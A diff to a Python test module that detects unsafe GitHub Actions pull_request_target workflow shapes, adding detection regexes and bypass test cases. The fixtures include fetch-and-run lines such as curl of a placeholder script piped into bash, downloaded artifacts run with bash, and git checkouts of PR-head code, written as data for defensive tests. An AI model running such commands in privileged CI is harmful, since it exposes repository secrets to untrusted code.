@@ -10,6 +10,8 @@ worktree); execution belongs in an unprivileged ``pull_request`` workflow.
 
 from __future__ import annotations
 
+import hashlib
+import json
 import re
 from pathlib import Path
 from typing import Any
@@ -51,8 +53,20 @@ FOREIGN_ARTIFACT_INPUTS = {"run-id", "github-token", "repository"}
 # github-script may read metadata through the API but not repository content.
 SCRIPT_CONTENT_FETCH = re.compile(
     r"\b(?:getContent|getBlob|getTree|downloadTarballArchive|downloadZipballArchive|getArchive)\b"
-    r"|\bgithub\.request\b|\bfetch\(|\bhttps?\.(?:get|request)\(|pull_request\.head\b"
+    r"|\b(?:compareCommits|compareCommitsWithBasehead|getCommit|listFiles)\b|\bmediaType\b"
+    r"|\bon\s+(?:Blob|Tree)\b|\bobject\s*\(|\bgithub\.request\b|\bfetch\("
+    r"|\bhttps?\.(?:get|request)\(|pull_request\.head\b"
 )
+# Output of any command piped into an interpreter is executed.
+PIPE_TO_INTERPRETER = re.compile(
+    r"\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|eval|source|python[\d.]*|node|perl|ruby)\b"
+)
+# Artifact/repository downloads from outside this run.
+FOREIGN_DOWNLOAD = re.compile(
+    r"(?<![\w./-])gh\s+(?:run|release)\s+download\b|(?<![\w./-])gh\s+repo\s+clone\b"
+)
+PINNED_ACTION = re.compile(r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$")
+PUSH_ONLY_GUARD = "github.event_name == 'push'"
 EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.S)
 SHELL_SEPARATOR = re.compile(r"[;&|()\n`]|\$\(")
 GH_CHECKOUT = re.compile(r"(?<![\w./-])gh\s+pr\s+(?:checkout|diff)\b")
@@ -73,6 +87,7 @@ SCRIPT_PROCESS = re.compile(
     r"child_process|\bexec\.(?:exec|getExecOutput)\b|\bspawn(?:Sync)?\("
 )
 NETWORK_TOOL = re.compile(r"(?<![\w./-])(?:curl|wget|gh\s+api)\b")
+EXPRESSION_IN_BODY = re.compile(r"\$\{\{")
 
 
 def _triggers(workflow: dict[Any, Any]) -> set[str]:
@@ -131,6 +146,36 @@ def _shell_names_pr_ref(line: str, tainted: set[str]) -> bool:
     return any(re.search(rf"\$\{{?{re.escape(name)}\b", line) for name in tainted)
 
 
+def _top_level_conjuncts(expression: Any) -> list[str] | None:
+    """Split an ``if:`` on top-level ``&&``; None if a top-level ``||`` exists."""
+    text = _squash(expression).removeprefix("${{").removesuffix("}}").strip()
+    conjuncts, depth, start, index = [], 0, 0, 0
+    while index < len(text):
+        char = text[index]
+        if char in "([":
+            depth += 1
+        elif char in ")]":
+            depth -= 1
+        elif depth == 0 and text.startswith("||", index):
+            return None
+        elif depth == 0 and text.startswith("&&", index):
+            conjuncts.append(text[start:index].strip())
+            start = index + 2
+            index += 1
+        index += 1
+    conjuncts.append(text[start:].strip())
+    return conjuncts
+
+
+def _guarded(job: dict[Any, Any], step: dict[str, Any], *guards: str) -> bool:
+    """True when job or step ``if`` has one of ``guards`` as a top-level conjunct."""
+    for scope in (job, step):
+        conjuncts = _top_level_conjuncts(scope.get("if", "")) or []
+        if any(conjunct in guards for conjunct in conjuncts):
+            return True
+    return False
+
+
 def _checkout_problems(
     workflow: dict[Any, Any], job: dict[Any, Any], step: dict[str, Any]
 ) -> list[str]:
@@ -143,8 +188,8 @@ def _checkout_problems(
         return problems
     if ref not in NON_PR_CHECKOUT_REFS:
         problems.append(f"untrusted ref={with_.get('ref')!r}")
-    elif _triggers(workflow) & MERGE_REF_EVENTS and not any(
-        NON_PR_GUARD in _squash(scope.get("if", "")) for scope in (job, step)
+    elif _triggers(workflow) & MERGE_REF_EVENTS and not _guarded(
+        job, step, NON_PR_GUARD
     ):
         problems.append(f"merge-ref-capable ref={ref!r} without the non-PR-event guard")
     return problems
@@ -172,7 +217,8 @@ GIT_ALLOWED_OPTIONS = {
 GIT_GLOBAL_WITH_VALUE = {"-C"}
 # git reached indirectly, where the verb cannot be checked statically.
 INDIRECT_GIT = re.compile(
-    r"(?:command\s+-v|which|type\s+-p)\s+git\b|=\s*[\"']?(?:\S*/)?git[\"']?(?=[\s;&|)]|$)"
+    r"(?:command\s+-v|which|type\s+-p)\s+git\b"
+    r"|(?:^|[\s;&|])\w+=[\"']?(?:/[\w/.-]*/)?git[\"']?(?=[\s;&|)]|$)"
 )
 
 
@@ -180,10 +226,13 @@ def _git_violations(script: str) -> list[str]:
     """Return disallowed git invocations, parsed token by token per command."""
     problems: list[str] = []
     for command in SHELL_SEPARATOR.split(script):
-        tokens = [token.strip("\"'") for token in command.split()]
+        tokens = [token.strip("\"'").lstrip("\\") for token in command.split()]
         for start, token in enumerate(tokens):
             if token in {"command", "exec", "xargs", "env", "sudo"}:
                 continue
+            if re.fullmatch(r"\$\{\w+:-(?:\S*/)?git\}", token):
+                problems.append(f"git reached through parameter default {token}")
+                break
             if token.rsplit("/", 1)[-1] != "git":
                 continue
             index = start + 1
@@ -207,6 +256,8 @@ def _git_violations(script: str) -> list[str]:
                 problems.append(f"git cat-file {' '.join(args)}")
             elif verb == "diff" and not {"--name-only", "--name-status"} & set(args):
                 problems.append(f"git diff {' '.join(args)}")
+            elif verb == "fetch" and any(":" in arg for arg in args):
+                problems.append(f"git fetch refspec writes refs: {' '.join(args)}")
             break
     return problems
 
@@ -223,8 +274,13 @@ def _job_violations(
     where: str,
     root: Path | None,
     seen: set[str],
+    bodies: dict[str, str] | None = None,
 ) -> list[str]:
     violations: list[str] = []
+    for key in ("container", "services"):
+        if job.get(key):
+            # Docker runs these images before any step is inspected.
+            violations.append(f"{where} declares a job {key}")
     job_tainted = _tainted_env(workflow, job)
     uses = str(job.get("uses") or "")
     if uses:
@@ -251,6 +307,7 @@ def _job_violations(
                             f"{where}->{uses}:{callee_id}",
                             root,
                             seen,
+                            bodies,
                         )
                     )
         return violations
@@ -298,6 +355,12 @@ def _job_violations(
 
     expand(where, steps)
     tainted = job_tainted | _tainted_env(*(step for _, step in expanded))
+    for scope in (workflow, job, *(step for _, step in expanded)):
+        for name, value in (
+            (scope.get("env") or {}) if isinstance(scope, dict) else {}
+        ).items():
+            if str(value).strip().rsplit("/", 1)[-1] == "git":
+                violations.append(f"{where} aliases git through env {name}")
     # The git allowlist applies to every job in a pull_request_target
     # workflow: the head SHA is always reachable through GITHUB_EVENT_PATH,
     # FETCH_HEAD, or job outputs without naming it in this job.
@@ -312,6 +375,39 @@ def _job_violations(
             and not step_uses.startswith(ALLOWED_ACTIONS)
         ):
             violations.append(f"{label} uses unlisted action {step_uses}")
+        if (
+            step_uses
+            and not step_uses.startswith("./")
+            and not PINNED_ACTION.match(step_uses)
+        ):
+            violations.append(
+                f"{label} uses action not pinned to a full commit SHA: {step_uses}"
+            )
+        if step_uses.startswith("actions/cache/save@") and not _guarded(
+            job, step, NON_PR_GUARD, PUSH_ONLY_GUARD
+        ):
+            violations.append(
+                f"{label} saves a cache without a push-only or non-PR guard"
+            )
+        for key, body in (
+            ("run", step.get("run")),
+            ("shell", step.get("shell")),
+            (
+                "script",
+                (step.get("with") or {}).get("script")
+                if step_uses.startswith("actions/github-script@")
+                else None,
+            ),
+        ):
+            if body is None:
+                continue
+            if EXPRESSION_IN_BODY.search(str(body)):
+                violations.append(
+                    f"{label} interpolates an expression into its {key} body; pass it through env"
+                )
+            if bodies is not None:
+                digest = hashlib.sha256(str(body).encode("utf-8")).hexdigest()
+                bodies.setdefault(digest, f"{label} [{key}]")
         if step_uses.startswith("actions/github-script@"):
             body = _normalize((step.get("with") or {}).get("script", ""))
             if SCRIPT_PROCESS.search(body):
@@ -338,6 +434,12 @@ def _job_violations(
             continue
         if GH_CHECKOUT.search(script):
             violations.append(f"{label} runs gh pr checkout/diff")
+        if PIPE_TO_INTERPRETER.search(script):
+            violations.append(f"{label} pipes command output into an interpreter")
+        if FOREIGN_DOWNLOAD.search(script):
+            violations.append(
+                f"{label} downloads artifacts or repositories from outside this run"
+            )
         if INDIRECT_GIT.search(script):
             violations.append(f"{label} reaches git indirectly")
         for problem in _git_violations(script):
@@ -355,7 +457,10 @@ def _job_violations(
 
 
 def pull_request_target_violations(
-    workflow: dict[Any, Any], label: str, root: Path | None = ROOT
+    workflow: dict[Any, Any],
+    label: str,
+    root: Path | None = ROOT,
+    bodies: dict[str, str] | None = None,
 ) -> list[str]:
     """Flag pull_request_target workflow shapes that can bring PR-head content in.
 
@@ -378,7 +483,16 @@ def pull_request_target_violations(
     for job_id, job in (workflow.get("jobs") or {}).items():
         if isinstance(job, dict):
             violations.extend(
-                _job_violations(workflow, job, f"{label}:{job_id}", root, set())
+                _job_violations(workflow, job, f"{label}:{job_id}", root, set(), bodies)
+            )
+    if "actions/checkout@" in str(workflow.get("jobs")):
+        # Checked-out base.sha is "trusted" only if it is protected history.
+        on = workflow.get("on", workflow.get(True))
+        target = on.get("pull_request_target") if isinstance(on, dict) else None
+        branches = (target or {}).get("branches") if isinstance(target, dict) else None
+        if branches != ["main"]:
+            violations.append(
+                f"{label} checks out code but pull_request_target is not limited to branches: [main]"
             )
     return violations
 
@@ -391,21 +505,76 @@ def _workflow_files() -> list[Path]:
     return sorted([*WORKFLOWS.glob("*.yml"), *WORKFLOWS.glob("*.yaml")])
 
 
-def test_no_pull_request_target_workflow_checks_out_pull_request_head() -> None:
-    scanned = []
+REVIEWED_BODIES = Path(__file__).with_name("pull_request_target_reviewed_bodies.json")
+# Pre-existing finding tracked outside this guard's PR: auto-arm-auto-merge.yml
+# runs the tag-pinned actions/create-github-app-token@v2 with the merge-steward
+# App key (follow-up: SHA-pin it). Exact text; once fixed this entry goes stale
+# and the test fails until it is removed, so the exception cannot outlive it.
+KNOWN_VIOLATIONS = {
+    "auto-arm-auto-merge.yml:arm-auto-merge:step[0] Create merge steward app token "
+    "uses action not pinned to a full commit SHA: actions/create-github-app-token@v2",
+}
+
+
+def _repository_scan() -> tuple[list[str], list[str], dict[str, str]]:
+    scanned: list[str] = []
     violations: list[str] = []
+    bodies: dict[str, str] = {}
     for path in _workflow_files():
         workflow = _load(path)
         if "pull_request_target" in _triggers(workflow):
             scanned.append(path.name)
-        violations.extend(pull_request_target_violations(workflow, path.name))
+        violations.extend(
+            pull_request_target_violations(workflow, path.name, bodies=bodies)
+        )
+    return scanned, violations, bodies
+
+
+def test_no_pull_request_target_workflow_checks_out_pull_request_head() -> None:
+    scanned, violations, _ = _repository_scan()
     # Not vacuous: the privileged Runtime OS advisory must still be scanned.
     assert "ci-runtime-os-advisory.yml" in scanned
-    assert violations == []
+    assert sorted(set(violations) - KNOWN_VIOLATIONS) == []
+    assert sorted(KNOWN_VIOLATIONS - set(violations)) == [], (
+        "stale KNOWN_VIOLATIONS entry"
+    )
+
+
+def test_every_privileged_body_is_reviewed_and_pinned() -> None:
+    """Closed gate: every run/shell/github-script body reachable from a
+    pull_request_target workflow (including composite actions and local
+    reusable workflows) must match a reviewed SHA-256 pin, so new privileged
+    code cannot slip past the pattern rules above without a reviewed pin."""
+    _, _, bodies = _repository_scan()
+    pinned = json.loads(REVIEWED_BODIES.read_text(encoding="utf-8"))["bodies"]
+    unpinned = {
+        digest: where for digest, where in bodies.items() if digest not in pinned
+    }
+    stale = sorted(set(pinned) - set(bodies))
+    assert unpinned == {}, (
+        f"review these bodies, then pin their sha256 in {REVIEWED_BODIES.name}"
+    )
+    assert stale == [], f"remove stale pins from {REVIEWED_BODIES.name}"
 
 
 def _prt(steps: list[dict[str, Any]], **job: Any) -> dict[Any, Any]:
-    return {True: {"pull_request_target": {}}, "jobs": {"j": {"steps": steps, **job}}}
+    return {
+        True: {"pull_request_target": {"branches": ["main"]}},
+        "jobs": {"j": {"steps": steps, **job}},
+    }
+
+
+def _pinned(value: Any) -> Any:
+    """Pin synthetic remote actions to a full SHA so allow-cases test one rule."""
+    if isinstance(value, dict):
+        pinned = {key: _pinned(item) for key, item in value.items()}
+        uses = pinned.get("uses")
+        if isinstance(uses, str) and not uses.startswith("./") and "@" in uses:
+            pinned["uses"] = uses.split("@", 1)[0] + "@" + "0" * 40
+        return pinned
+    if isinstance(value, list):
+        return [_pinned(item) for item in value]
+    return value
 
 
 @pytest.mark.parametrize(
@@ -606,7 +775,7 @@ def test_detector_flags_pull_request_head_materialization(
     ],
 )
 def test_detector_allows_base_code_and_pr_data(workflow: dict[Any, Any]) -> None:
-    assert pull_request_target_violations(workflow, "synthetic") == []
+    assert pull_request_target_violations(_pinned(workflow), "synthetic") == []
 
 
 _TAINTED_FETCH = {
@@ -734,7 +903,10 @@ def _prt_review(steps: list[dict[str, Any]], **job: Any) -> dict[Any, Any]:
     # pull_request_review shares the workflow but resolves github.sha to the
     # PR merge ref.
     return {
-        True: {"pull_request_target": {}, "pull_request_review": {}},
+        True: {
+            "pull_request_target": {"branches": ["main"]},
+            "pull_request_review": {},
+        },
         "jobs": {"j": {"steps": steps, **job}},
     }
 
@@ -875,4 +1047,102 @@ def test_detector_rejects_frozen_head_review_bypasses(workflow: dict[Any, Any]) 
 def test_detector_allows_guarded_and_pinned_trusted_shapes(
     workflow: dict[Any, Any],
 ) -> None:
-    assert pull_request_target_violations(workflow, "synthetic", root=None) == []
+    assert (
+        pull_request_target_violations(_pinned(workflow), "synthetic", root=None) == []
+    )
+
+
+_H = {"H": "${{ github.event.pull_request.head.sha }}"}
+
+
+@pytest.mark.parametrize(
+    "workflow",
+    [
+        # Review round on ba8544a6.
+        {
+            True: {"pull_request_target": {}},
+            "jobs": {"j": {"steps": [{"uses": "actions/checkout@" + "0" * 40}]}},
+        },
+        _prt([{"run": "true"}], container={"image": "${{ github.head_ref }}"}),
+        _prt([{"run": "true"}], services={"pwn": {"image": "ghcr.io/o/pwn:latest"}}),
+        _prt([
+            {
+                "uses": "actions/cache/save@" + "0" * 40,
+                "with": {"path": "x", "key": "k"},
+            }
+        ]),
+        _prt([
+            {
+                "run": 'pip install "git+https://github.com/o/r@${{ github.event.pull_request.head.sha }}"'
+            }
+        ]),
+        _prt([{"run": 'npx "github:o/r#${{ github.event.pull_request.head.sha }}"'}]),
+        _prt([
+            {
+                "env": _H,
+                "run": 'git fetch origin "$H"\ngit diff --name-only "$B" "$H" | bash',
+            }
+        ]),
+        _prt([
+            {
+                "run": 'curl -sSfL https://example.invalid/i.sh | bash\necho "x  f" | sha256sum -c -'
+            }
+        ]),
+        _prt([{"run": "gh run download 123 -n env && bash env/run.sh"}]),
+        _prt([{"env": {"G": "git"}, "run": "$G checkout FETCH_HEAD"}]),
+        _prt([{"run": '\\git checkout "$X"'}]),
+        _prt([{"run": '"${GIT:-git}" checkout FETCH_HEAD'}]),
+        _prt([{"env": _H, "run": 'git fetch origin "$H:refs/heads/x"'}]),
+        _prt_review([
+            {
+                "if": '${{ !contains(fromJSON(\'["pull_request_target","pull_request_review"]\'), github.event_name) || true }}',
+                "uses": "actions/checkout@" + "0" * 40,
+                "with": {"ref": "${{ github.sha }}"},
+            }
+        ]),
+        _prt([
+            {
+                "uses": "actions/github-script@" + "0" * 40,
+                "with": {
+                    "script": 'const r = await github.graphql(`{repository(owner:"o",name:"r"){object(expression:"x"){... on Blob {text}}}}`)'
+                },
+            }
+        ]),
+        _prt([
+            {
+                "uses": "actions/github-script@" + "0" * 40,
+                "with": {
+                    "script": "await github.rest.repos.compareCommits({owner, repo, base, head, mediaType: {format: 'diff'}})"
+                },
+            }
+        ]),
+    ],
+)
+def test_detector_rejects_round_ba8544a6_bypasses(workflow: dict[Any, Any]) -> None:
+    assert pull_request_target_violations(workflow, "synthetic", root=None)
+
+
+def test_privileged_bodies_are_collected_for_the_review_manifest(
+    tmp_path: Path,
+) -> None:
+    action = tmp_path / ".github/actions/inner"
+    action.mkdir(parents=True)
+    (action / "action.yml").write_text(
+        "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo nested\n",
+        encoding="utf-8",
+    )
+    bodies: dict[str, str] = {}
+    workflow = _prt([
+        {"run": "echo top"},
+        {
+            "uses": "actions/github-script@" + "0" * 40,
+            "with": {"script": "core.info('x')"},
+        },
+        {"uses": "./.github/actions/inner"},
+    ])
+    pull_request_target_violations(workflow, "synthetic", root=tmp_path, bodies=bodies)
+    digests = {
+        hashlib.sha256(text.encode()).hexdigest()
+        for text in ("echo top", "core.info('x')", "echo nested", "bash")
+    }
+    assert digests == set(bodies)
